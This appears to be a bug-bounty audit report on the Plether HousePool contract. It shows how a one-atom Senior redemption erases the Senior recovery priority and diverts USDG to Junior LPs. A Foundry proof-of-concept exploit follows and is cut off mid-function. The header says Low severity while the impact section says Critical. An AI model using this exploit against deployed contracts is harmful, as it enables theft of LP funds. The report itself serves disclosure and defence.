# \#99418 [SC-Low] Virtual-share rounding in Senior redemption erases surviving LP recovery priority and diverts USDG to Junior LPs

**Submitted on Nov 13th 2026 at 15:30:59 UTC by @Pig46940 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99418
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A Senior LP can request redemption while the Senior tranche is heavily impaired. At the last USDG atom of Senior principal, the vault's virtual-share quote can fund only part of the Senior share supply for that atom. HousePool nevertheless clears the entire Senior high-water mark because it scales that mark by the funded USDG divided by the one-atom principal. Independent Senior shares survive without their recovery priority. Later recapitalization and trading revenue can then be credited to Junior, and a Junior LP can withdraw USDG that should first restore those surviving Senior LPs.

## Vulnerability Details

The high-water mark represents Senior's priority to recover impairment. The pinned security and accounting documents say Senior impairment is restored before Junior receives surplus, and the pending-accounting path recognizes surviving Senior share supply as a claimant during recapitalization.

The vault's funded-asset quote includes virtual assets and shares. Consequently, a payout equal to all remaining Senior *principal* can burn fewer than all real Senior shares:

```solidity
// HousePoolRedemptionMathLib.sol, lines 45–47
uint256 grossAssets =
    Math.mulDiv(shares, principal + virtualAssets, supply + virtualShares, Math.Rounding.Floor);
return Math.mulDiv(grossAssets, BPS - feeBps, BPS, Math.Rounding.Floor);
```

HousePool passes the actual funded USDG to the recovery-target update after transferring that USDG into the Senior vault:

```solidity
// HousePool.sol, lines 854–862
seniorPhase = _fundRedemptionPhase(
    seniorVault, result.cutoffEpoch, seniorPhase, _settlementFeeBps(true, statusSnapshot.oracleFrozen)
);
if (seniorPhase.fundedAssets > 0) {
    HousePoolWaterfallAccountingLib.WaterfallState memory nextState =
        HousePoolWaterfallAccountingLib.scaleSeniorOnWithdraw(_getWaterfallState(), seniorPhase.fundedAssets);
    _setWaterfallState(nextState);
    accountedAssets -= seniorPhase.fundedAssets;
    freeAssets -= seniorPhase.fundedAssets;
}
```

The scaling formula clears the complete historical target when `fundedAssets == seniorPrincipal`, without checking whether all Senior shares or all protected owners exited:

```solidity
// HousePoolWaterfallAccountingLib.sol, lines 123–130
nextState = state;
if (fundedAssets == 0) {
    return nextState;
}
nextState.seniorHighWaterMark -= Math.mulDiv(
    state.seniorHighWaterMark, fundedAssets, state.seniorPrincipal, Math.Rounding.Floor
);
nextState.seniorPrincipal -= fundedAssets;
```

For a one-atom principal, an attacker-owned Senior redemption funded for one atom makes the fraction `fundedAssets / seniorPrincipal` equal to one. The complete high-water mark becomes zero even when an independent Senior LP still owns shares. A legitimate subsequent recapitalization sees that surviving supply but initializes the mark from the *new* recapitalization amount:

```solidity
// HousePoolPendingPreviewLib.sol, lines 117–122
if (state.seniorSupply > 0) {
    if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
        state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
    }
}
```

Later trading revenue restores Senior only up to the shortened mark. HousePoolWaterfallAccountingLib's `distributeRevenue` then adds the remainder to `juniorPrincipal` (lines 147–159). The Junior vault can fund and pay a real USDG redemption from that principal.

**Incomplete prior fix.** Cecuro MED-11 identified a Senior high-water-mark reduction that let remaining Senior owners lose restoration priority because the share fraction and funded-asset fraction differed. Its acknowledged fix changed the reduction to the funded-asset fraction and stated that full principal funding clears the mark. The pinned implementation still fails at the virtual-share dust boundary: full *principal* funding does not imply full *Senior-share* exit. The surviving Senior owner loses restoration priority, while later Junior funding and withdrawal convert that accounting error into a lower Senior wallet receipt. This is the incomplete-fix condition covered by the competition's published-known-issue rule; it does not depend on the old share-fraction implementation.

## Impact Details

**Selected in-scope impact: Critical — Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.** The affected asset is USDG held by HousePool and paid through the Senior and Junior TrancheVaults. The Senior high-water mark is the recovery target for previously impaired Senior capital, so the lost redemption proceeds represent foregone principal recovery, rather than an unclaimed yield allocation.

In the measured selected state, an independently funded Senior LP and a separate LP holding Senior and Junior shares coexist. Immediately before the latter's one-atom Senior exit, the Pool has one USDG atom and the Senior high-water mark is 40,000.221643 USDG. The independent Senior owner still has 15,876,216,484,723 raw shares. The exit clears the historical mark; a legitimate 2,600 USDG owner recapitalization creates only a new 2,600 USDG mark; a later trader loss contributes 4,982.000108 USDG to the Pool. The Junior LP claims the resulting redemption.

Both histories start from the same EVM snapshot. The independent Senior LP redeems the same 15,875,216,484,723 raw shares, fully funded in both histories. The recorded ERC20 wallet receipts are:

| Recipient / actual payment | Recovery before the one-atom exit | One-atom exit before recovery | Difference |
| --- | ---: | ---: | ---: |
| Independent Senior LP | 3,013.828343 USDG | 2,599.859976 USDG | **−413.968367 USDG** |
| Attacker's final wallet receipts | 4,567.981921 USDG | 4,981.739502 USDG | **+413.757581 USDG** |
| Attacker's Junior redemption in adverse history | 0 USDG | 4,981.739501 USDG | Actual vault-to-wallet payment |

The attacker controls the timing of its own Senior redemption and Junior redemption. The Pool settlement entry is permissionless. The owner operations in the PoC are ordinary solvency recovery and recapitalization, and are not attacker privileges. No direct write to in-scope storage or forged contract role is used. The measured loss is an actual reduced payment to another LP, not only a mark or preview difference.

## References

- [Plether competition scope, eligible impacts and incomplete-fix rule](https://immunefi.com/audit-competition/plether/scope/)
- [Pinned accounting specification, Senior recovery priority](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L339)
- [Pinned security statement, Senior high-water protection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L388-L396)
- [Redemption asset quote](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolRedemptionMathLib.sol#L30-L47)
- [Senior withdrawal writer](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L845-L865)
- [High-water-mark scaling and revenue waterfall](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L112-L159)
- [Surviving-share recapitalization branch](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L130)
- [Original Cecuro report, MED-11, PDF pages 31–32](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)



## Proof of Concept

## Proof of Concept

**Runnable PoC:** The complete Solidity source is included under **“PoC Code”** below. Copy that code into a new test file; no separately supplied PoC file is needed.

1. In an isolated checkout of commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, go to the repository root and confirm the revision with `git rev-parse HEAD`. Leave all `packages/perps/src` files unchanged.
2. Create the test directory if it does not exist:

   ```bash
   mkdir -p packages/perps/test/perps/spec/lp
   ```

3. Create `packages/perps/test/perps/spec/lp/SeniorRecoveryDustSixFeedPoC.t.sol`. Copy **all the Solidity text** from the code block below. 
4. From the repository root, run the single test:

   ```bash
   cd packages/perps
   forge test -j 1 --match-path test/perps/spec/lp/SeniorRecoveryDustSixFeedPoC.t.sol --match-test test_IndependentSeniorLpLosesCashAtReleaseSettings -vv
   ```

The expected output is one passing `test_IndependentSeniorLpLosesCashAtReleaseSettings` test with the cash and share assertions in the code.
The test sets the documented release risk parameters, 1 USDG tranche seeds, 40M USDG/80% Senior cap, 1,000 USDG minimum open, and the six release feed identifiers, weights, base prices, and inversion flags. It executes all seven trader orders through public V3 Router commit/keeper execution, settles LP epochs through the public Pool entry, and compares two continuations from the same snapshot. The attack continuation verifies one-atom Pool cash, 40,000.221643 USDG historical Senior target, a one-atom Senior exit with surviving independent Senior shares and zero target, later ordinary owner recovery, actual Junior vault funding, and the different final ERC20 wallet receipts above. The test's Pyth updates and USDG are the permitted out-of-scope mocks; the six feed values are synthetic selected-state inputs, not an asserted historical signed market event.
Local execution at the pinned source produced `1 passed; 0 failed`. 

### PoC Code
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Install at packages/perps/test/perps/spec/lp/
import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Tests ACTUAL wallet receipts under matched EVM snapshots.
/// @dev Uses the actual public V3 OrderRouter.commitOrder/executeOrder paths, public
///      mark refresh and LP settlement, plus real account/LP claim entrypoints.
///      No vm.prank(address(router)), direct Engine.processOrderTyped, vm.store, or
///      Pool-impersonated token transfer. It uses the six release basket feeds
///      through MockPyth; it does not establish historical signed feed prices.
contract SeniorRecoveryDustSixFeedPoC is BasePerpTest {
    address internal constant ATTACKER_LP = address(0xA110);
    address internal constant PASSIVE_SENIOR_LP = address(0xB110);
    address internal constant LONG_TRADER = address(0xA111);
    address internal constant SHORT_TRADER = address(0xB111);
    address internal constant LOSS_TRADER = address(0xC111);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant STARTING_POOL = 61_000e6 - 2_479;
    uint256 internal constant RECAP_ASSETS = 2_600e6;
    uint256 internal constant LOSS_SIZE = 3_000e18;
    uint256 internal constant LOSS_OPEN_PRICE = 34_000_000; // 0.34, LONG entry notional = 1020 USDG
    uint256 internal constant LOSS_CLOSE_PRICE = 200_000_000; // 2.00, price loss = 4980 USDG

    struct Outcome {
        uint256 actorSeniorPaid;
        uint256 actorJuniorPaid;
        uint256 actorWalletFinal;
        uint256 victimPaid;
        uint256 victimSharesRequested;
        uint256 victimSharesFunded;
        uint256 seniorPrincipalAfter;
        uint256 seniorHwmAfter;
        uint256 juniorPrincipalAfter;
    }

    function setUp() public override {
        super.setUp();
        bytes32[] memory feedIds = _releaseFeedIds();
        uint256[] memory weights = _releaseWeights();
        uint256[] memory basePrices = _releaseBasePrices();
        bool[] memory inverted = _releaseInversions();
        for (uint256 index; index < feedIds.length; ++index) {
            uint256 rawPrice = _rawFeedPrice(100_000_000, basePrices[index], inverted[index]);
            baseMockPyth.setPrice(feedIds[index], int64(uint64(rawPrice)), 0, -8, block.timestamp);
        }
        PletherOracle sixFeedOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), feedIds, weights, basePrices, inverted
        );
        IOrderRouterAdminHost.RouterConfig memory releaseRouterConfig = _routerConfig();
        releaseRouterConfig.minOpenNotionalAssets = 1_000e6;
        routerAdmin.proposeRouterConfig(releaseRouterConfig);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(sixFeedOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        routerAdmin.finalizeRouterConfig();
        pletherOracle = sixFeedOracle;
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);
        _publicMarkRefresh(100_000_000);
    }

    function _releaseFeedIds() private pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _releaseWeights() private pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _releaseBasePrices() private pure returns (uint256[] memory basePrices) {
        basePrices = new uint256[](6);
        basePrices[0] = 117_500_000;
        basePrices[1] = 638_000;
        basePrices[2] = 134_480_000;
        basePrices[3] = 72_880_000;
        basePrices[4] = 10_860_000;
        basePrices[5] = 126_100_000;
    }

    function _releaseInversions() private pure returns (bool[] memory inverted) {
        inverted = new bool[](6);
        inverted[1] = true;
        inverted[3] = true;
        inverted[4] = true;
        inverted[5] = true;
    }

    function _rawFeedPrice(uint256 basketPrice, uint256 basePrice, bool inverted)
        private pure returns (uint256)
    {
        uint256 normalizedComponent = basePrice * basketPrice / 100_000_000;
        return inverted ? (10_000_000_000_000_000 + normalizedComponent / 2) / normalizedComponent
            : normalizedComponent;
    }

    function _sixFeedUpdateData(uint256 basketPrice, bool historicalOrderPrice)
        private returns (bytes[] memory updateData)
    {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = historicalOrderPrice ? _mockHistoricalPublishTime() : vm.getBlockTimestamp();
        bytes32[] memory feedIds = _releaseFeedIds();
        uint256[] memory basePrices = _releaseBasePrices();
        bool[] memory inverted = _releaseInversions();
        MockPyth.FeedUpdate[] memory feedUpdates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 index; index < feedIds.length; ++index) {
            uint256 rawPrice = _rawFeedPrice(basketPrice, basePrices[index], inverted[index]);
            feedUpdates[index] = MockPyth.FeedUpdate({
                id: feedIds[index],
                price: MockPyth.MockPrice({
                    price: int64(uint64(rawPrice)),
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime == 0 ? 0 : publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(feedUpdates);
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _seniorSeedReceiver() internal pure override returns (address) { return PASSIVE_SENIOR_LP; }
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory parameters) {
        parameters = super._riskParams();
        parameters.baseCarryBps = 500;
        parameters.vpiFactor = 0.01e18;
        parameters.maintMarginBps = 10;
        parameters.initMarginBps = 20;
    }

    function test_IndependentSeniorLpLosesCashAtReleaseSettings() public {
        _setSeniorCapacity(40_000_000e6, 8_000);
        // The fixture's 72-hour governance delay ends during the FX weekend.
        // Wait until the ordinary Monday live market before updating the mark.
        vm.warp(block.timestamp + 1 days);
        assertFalse(engine.isOracleFrozen(), "six-feed setup requires live FX hours");
        assertEq(router.minOpenNotionalAssets(), 1_000e6, "release Router open minimum");
        _publicMarkRefresh(100_000_000);
        _matchedEconomicHistories();
    }

    function _matchedEconomicHistories() private {
        uint256 actorSeniorRequest = _prepareCashWipeAndMaturedExit();
        uint256 sharedStartingSnapshot = vm.snapshotState();

        Outcome memory control = _control_ExitAfterFreshRevenue(actorSeniorRequest);
        assertTrue(vm.revertToState(sharedStartingSnapshot));
        Outcome memory adverse = _adverse_ExitBeforeOwnerRecapAndFreshRevenue(actorSeniorRequest);

        console2.log("control actor senior USDG atoms", control.actorSeniorPaid);
        console2.log("adverse actor senior USDG atoms", adverse.actorSeniorPaid);
        console2.log("adverse actor junior USDG atoms", adverse.actorJuniorPaid);
        console2.log("control actor wallet USDG atoms", control.actorWalletFinal);
        console2.log("adverse actor wallet USDG atoms", adverse.actorWalletFinal);
        console2.log("control victim redeemed USDG atoms", control.victimPaid);
        console2.log("adverse victim redeemed USDG atoms", adverse.victimPaid);
        console2.log("victim shares redeemed (both)", control.victimSharesRequested);
        console2.log("adverse residual junior principal atoms", adverse.juniorPrincipalAfter);

        // Cross-cohort cash transfer, not just a HWM/snapshot display discrepancy.
        assertEq(adverse.victimSharesRequested, control.victimSharesRequested, "victim same shares");
        assertEq(control.victimSharesFunded, control.victimSharesRequested, "control fully funded");
        assertEq(adverse.victimSharesFunded, adverse.victimSharesRequested, "adverse fully funded");
        assertGt(adverse.actorJuniorPaid, 0, "Junior receives real escrow USDG");
        assertGt(adverse.actorWalletFinal, control.actorWalletFinal + 5e6, "actor's realized net gain");
        assertGt(control.victimPaid, adverse.victimPaid + 5e6, "victim's realized loss");
    }

    function _prepareCashWipeAndMaturedExit() private returns (uint256 requestId) {
        // Genuine seeded and activated LP capital. Junior actor owns 20k of 21k;
        // Senior attacker and passive LP each fund their own shares; the passive LP also holds the protected seed.
        _fundTrancheByPublicEntrypoints(juniorVault, ATTACKER_LP, 20_999e6 - 2_479);
        _fundTrancheByPublicEntrypoints(seniorVault, ATTACKER_LP, 24_099e6);
        _fundTrancheByPublicEntrypoints(seniorVault, PASSIVE_SENIOR_LP, 15_900e6);
        assertEq(pool.totalAssets(), STARTING_POOL, "initial physical assets");
        assertEq(engine.executionFeeBps(), 4, "fee vector requires the default 4bps");

        _waitCooldown(seniorVault, ATTACKER_LP);
        uint256 burnShares = seniorVault.balanceOf(ATTACKER_LP);
        assertGt(seniorVault.balanceOf(PASSIVE_SENIOR_LP), 0, "independent Senior LP funded shares");
        vm.prank(ATTACKER_LP);
        requestId = seniorVault.requestRedeem(burnShares, ATTACKER_LP, ATTACKER_LP);
        _mature(requestId);

        _fundTrader(LONG_TRADER, 20_000e6);
        _fundTrader(SHORT_TRADER, 20_000e6);
        _fundTrader(LOSS_TRADER, 10_000e6);

        // Initialize the authenticated live market mark through a public Router action.
        _publicMarkRefresh(100_000_000);

        // Each order goes through trader V3 commit, FIFO, unique historical MockPyth,
        // keeper execution, Book receipt and live Engine/Clearinghouse settlement.
        _executePublicV3Order(LONG_TRADER, CfdTypes.Side.LONG, 24_000e18, 960e6, false, 100_000_000);
        _executePublicV3Order(SHORT_TRADER, CfdTypes.Side.SHORT, 40_000e18, 1_600e6, false, 100_000_000);
        _executePublicV3Order(LONG_TRADER, CfdTypes.Side.LONG, 18_000e18, 720e6, false, 100_000_000);
        _executePublicV3Order(LONG_TRADER, CfdTypes.Side.LONG, 42_000e18, 0, true, 49_839_446);
        console2.log("pool after LONG close", pool.totalAssets());
        console2.log("degraded after LONG close", engine.degradedMode());
        _executePublicV3Order(SHORT_TRADER, CfdTypes.Side.SHORT, 40_000e18, 0, true, 200_000_000);
        console2.log("pool after SHORT close", pool.totalAssets());
        assertEq(pool.totalAssets(), 1, "selected Pool cash is one USDG atom");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no deferred trader claims");
        if (engine.degradedMode()) engine.clearDegradedMode();
        assertGt(pool.seniorHighWaterMark(), 39_900e6, "senior historical recovery target");
    }

    function _control_ExitAfterFreshRevenue(uint256 firstSeniorRequest) private returns (Outcome memory outcome) {
        _ownerRecap(RECAP_ASSETS);
        _realizeExactlyOneTraderPriceLoss();
        _freshNeutralMark();
        // On reconciliation the old high-water mark restores Senior first.
        IHousePool.LpEpochSettlementResult memory settlementResult = pool.settleLpEpoch(0, 0);
        assertGt(settlementResult.seniorFundedAssets, 0, "matured Senior exit must fund");
        outcome.actorSeniorPaid = _claim(seniorVault, firstSeniorRequest, ATTACKER_LP);
        assertEq(pool.juniorPrincipal(), 0, "control loss recovery belongs to Senior");
        (outcome.victimPaid, outcome.victimSharesRequested, outcome.victimSharesFunded) = _redeemVictim();
        outcome.actorWalletFinal = settlementToken.balanceOf(ATTACKER_LP);
        outcome.seniorPrincipalAfter = pool.seniorPrincipal();
        outcome.seniorHwmAfter = pool.seniorHighWaterMark();
        outcome.juniorPrincipalAfter = pool.juniorPrincipal();
    }

    function _adverse_ExitBeforeOwnerRecapAndFreshRevenue(uint256 firstSeniorRequest)
        private returns (Outcome memory outcome)
    {
        _freshNeutralMark();
        console2.log("Senior HWM before one-atom withdrawal", pool.seniorHighWaterMark());
        console2.log("independent Senior shares before withdrawal", seniorVault.balanceOf(PASSIVE_SENIOR_LP));
        IHousePool.LpEpochSettlementResult memory early = pool.settleLpEpoch(0, 0);
        assertEq(early.seniorFundedAssets, 1, "one atom exhausts Senior principal");
        outcome.actorSeniorPaid = _claim(seniorVault, firstSeniorRequest, ATTACKER_LP);
        assertEq(pool.seniorPrincipal(), 0, "Senior wiped through premature withdrawal");
        assertEq(pool.seniorHighWaterMark(), 0, "surviving Senior HWM is erased");
        assertGt(seniorVault.totalSupply(), 0, "victim and seed shares survive");

        _ownerRecap(RECAP_ASSETS);
        // Need a real, progressing, permissionless reconciliation of pending recap
        // before the fresh trader revenue arrives; this is a refund of a zero-NAV
        // Junior request (not an admin call or a fabricated Pool mutation).
        _waitCooldown(juniorVault, ATTACKER_LP);
        uint256 juniorDryShares = juniorVault.maxRequestRedeem(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 dryId = juniorVault.requestRedeem(juniorDryShares, ATTACKER_LP, ATTACKER_LP);
        _mature(dryId);
        _freshNeutralMark();
        pool.settleLpEpoch(0, 0);
        assertEq(pool.pendingRecapitalizationAssets(), 0, "recap must be reconciled once");
        assertEq(pool.seniorPrincipal(), RECAP_ASSETS, "recap creates new tiny Senior principal");
        assertEq(pool.seniorHighWaterMark(), RECAP_ASSETS, "historical HWM was lost");
        assertEq(pool.juniorPrincipal(), 0, "Junior is not funded before new revenue");
        assertGt(juniorVault.refundableRedeemRequest(dryId, ATTACKER_LP), 0, "zero-NAV request refunded");
        vm.prank(ATTACKER_LP);
        juniorVault.claimRedeemRefund(dryId, ATTACKER_LP, ATTACKER_LP);

        _realizeExactlyOneTraderPriceLoss();
        // At the subsequent reconcile, the 4980 USDG is now credited to Junior.
        _waitCooldown(juniorVault, ATTACKER_LP);
        uint256 juniorShares = juniorVault.maxRequestRedeem(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 juniorRequest = juniorVault.requestRedeem(juniorShares, ATTACKER_LP, ATTACKER_LP);
        _mature(juniorRequest);
        _freshNeutralMark();
        pool.settleLpEpoch(0, 0);
        assertGt(pool.juniorPrincipal(), 0, "Senior-capacity covenant leaves some Junior capital");
        assertGt(juniorVault.claimableRedeemRequest(juniorRequest, ATTACKER_LP), 0, "Junior funding starts");

        // Same victim shares, same claim route, but lower Senior ownership and payout.
        (outcome.victimPaid, outcome.victimSharesRequested, outcome.victimSharesFunded) = _redeemVictim();

        // Victim's Senior exit lowers the protected exposure and unlocks further
        // Junior funding. The same pending Junior epoch can receive multiple funding passes.
        uint256 fundedJuniorShares = juniorVault.claimableRedeemRequest(juniorRequest, ATTACKER_LP);
        assertGt(fundedJuniorShares, 0, "Junior has funded escrow");
        outcome.actorJuniorPaid = _claim(juniorVault, juniorRequest, ATTACKER_LP);
        outcome.actorWalletFinal = settlementToken.balanceOf(ATTACKER_LP);
        outcome.seniorPrincipalAfter = pool.seniorPrincipal();
        outcome.seniorHwmAfter = pool.seniorHighWaterMark();
        outcome.juniorPrincipalAfter = pool.juniorPrincipal();
    }

    function _ownerRecap(uint256 amount) private {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
    }

    function _realizeExactlyOneTraderPriceLoss() private {
        uint256 cashBefore = pool.totalAssets();
        // commitOrder preflights at the CACHED mark, not the future execution tick.
        // The preceding SHORT close left the cached mark at 2.00, where a 3,000-unit
        // LONG would violate the 40% skew ceiling with only 2,600 USDG of depth.
        // Advance time if needed: changing price at an identical publishTime is rejected.
        assertFalse(engine.terminalNavSnapshot().hasOpenPositions, "recovery open requires flat book");
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        _publicMarkRefresh(LOSS_OPEN_PRICE);
        assertApproxEqAbs(engine.lastMarkPrice(), LOSS_OPEN_PRICE, 50, "commit cached mark near 0.34");
        _executePublicV3Order(LOSS_TRADER, CfdTypes.Side.LONG, LOSS_SIZE, 6_000e6, false, LOSS_OPEN_PRICE);
        _executePublicV3Order(LOSS_TRADER, CfdTypes.Side.LONG, LOSS_SIZE, 0, true, LOSS_CLOSE_PRICE);
        console2.log("trader price-loss revenue", pool.totalAssets() - cashBefore);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no new claim should be issued");
    }

    function _redeemVictim() private returns (uint256 assets, uint256 requested, uint256 funded) {
        _waitCooldown(seniorVault, PASSIVE_SENIOR_LP);
        requested = seniorVault.maxRequestRedeem(PASSIVE_SENIOR_LP);
        assertGt(requested, 0, "victim must have non-seed Senior shares");
        vm.prank(PASSIVE_SENIOR_LP);
        uint256 id = seniorVault.requestRedeem(requested, PASSIVE_SENIOR_LP, PASSIVE_SENIOR_LP);
        _mature(id);
        _freshNeutralMark();
        pool.settleLpEpoch(0, 0);
        funded = seniorVault.claimableRedeemRequest(id, PASSIVE_SENIOR_LP);
        assertEq(funded, requested, "all victim's redeemable shares must fund");
        assets = _claim(seniorVault, id, PASSIVE_SENIOR_LP);
    }

    function _claim(TrancheVault vault, uint256 requestId, address beneficiary) private returns (uint256 assets) {
        uint256 shares = vault.claimableRedeemRequest(requestId, beneficiary);
        assertGt(shares, 0, "claim has funded shares");
        uint256 oldBalance = settlementToken.balanceOf(beneficiary);
        vm.prank(beneficiary);
        assets = vault.claimRedeem(requestId, shares, beneficiary, beneficiary);
        assertEq(settlementToken.balanceOf(beneficiary) - oldBalance, assets, "real ERC20 received");
    }

    function _waitCooldown(TrancheVault vault, address owner) private {
        uint256 ready = vault.lastDepositTime(owner) + vault.DEPOSIT_COOLDOWN() + 1;
        if (block.timestamp < ready) vm.warp(ready);
    }

    function _mature(uint256 requestId) private {
        uint256 ready = pool.lpEpochStart(requestId);
        if (block.timestamp < ready) vm.warp(ready);
    }

    function _freshNeutralMark() private {
        _publicMarkRefresh(100_000_000);
    }

    /// @notice Real permissionless Router mark update with official MockPyth data.
    function _publicMarkRefresh(uint256 price) private {
        bytes[] memory updateData = _sixFeedUpdateData(price, false);
        uint256 feeWei = pletherOracle.getUpdateFee(updateData);
        vm.deal(KEEPER, 10 ether);
        vm.prank(KEEPER);
        router.updateMarkPrice{value: feeWei}(updateData);
        console2.log("actual six-feed mark", engine.lastMarkPrice());
        assertApproxEqAbs(engine.lastMarkPrice(), price, 50, "six-feed mark deviation");
    }

    /// @notice Public ERC-7540-style asynchronous entry, with no test-only Router impersonation.
    /// @dev No positions exist when this helper runs, so the publicly callable cached
    ///      HousePool settlement route is canonical per ACCOUNTING_SPEC.md.
    function _fundTrancheByPublicEntrypoints(TrancheVault vault, address lp, uint256 amount) private {
        ICfdEngineTypes.TerminalNavSnapshot memory snap = engine.terminalNavSnapshot();
        assertFalse(snap.hasOpenPositions, "LP setup must have no open positions");
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 depositId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _mature(depositId);
        vm.prank(KEEPER);
        pool.settleLpEpoch(0, 0);
        uint256 claimable = vault.claimableDepositRequest(depositId, lp);
        assertEq(claimable, amount, "full amount activated through public settlement");
        vm.prank(lp);
        uint256 shares = vault.claimDeposit(depositId, claimable, lp, lp);
        assertGt(shares, 0, "LP claim must mint real shares");
    }

    /// @notice Public production V3 order flow, not the harness's scalar adapter.
    /// @dev Uses the official mock's unique historical-price behavior. Each public
    ///      order commits in one block, then executes in a later block/time.
    function _executePublicV3Order(
        address trader, CfdTypes.Side side, uint256 size, uint256 margin,
        bool isClose, uint256 price
    ) private {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        // The documented slippage comparison reverses across opening and closing.
        // These are permissive bounds, not fabricated off-chain fills.
        request.targetPrice = ((side == CfdTypes.Side.LONG) == isClose)
            ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(block.timestamp + 120);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7; // Live/FAD/Frozen (market policy still enforced)
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        assertTrue(request.bounds.expectedConfigHash != bytes32(0), "nonzero public V3 execution config hash");
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;

        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        assertEq(router.nextExecuteId(), orderId, "order must be the next FIFO head");
        console2.log("public order id", uint256(orderId));
        console2.log("public execution price", price);
        assertEq(
            uint8(router.lifecycleBook().lifecycleStatus(orderId)),
            uint8(OrderV3Types.LifecycleStatus.Pending),
            "order should remain pending before the keeper's public execution"
        );

